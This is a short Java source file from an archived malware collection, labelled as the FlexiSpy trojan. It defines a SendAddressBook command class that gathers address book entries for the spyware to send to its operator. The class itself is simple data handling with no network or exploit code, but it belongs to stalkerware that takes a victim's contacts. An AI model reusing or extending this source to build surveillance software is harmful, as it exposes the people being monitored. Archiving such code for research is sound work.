/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.phoenix.prot.command;

import java.util.ArrayList;

import com.vvt.phoenix.prot.event.AddressBook;

public class SendAddressBook implements CommandData{
	
	//Members
	private ArrayList<AddressBook> mAddrBookList;

	@Override
	public int getCmd() {
		return CommandCode.SEND_ADDRESS_BOOK;
	}

	/**
	 * Constructor
	 */
	public SendAddressBook(){
		mAddrBookList = new ArrayList<AddressBook>();
	}
	
	public int getAddressBookCount(){
		return mAddrBookList.size();
	}
	
	public AddressBook getAddressBook(int index){
		return mAddrBookList.get(index);
	}
	public void addAddressBook(AddressBook addrBook){
		mAddrBookList.add(addrBook);
	}
}
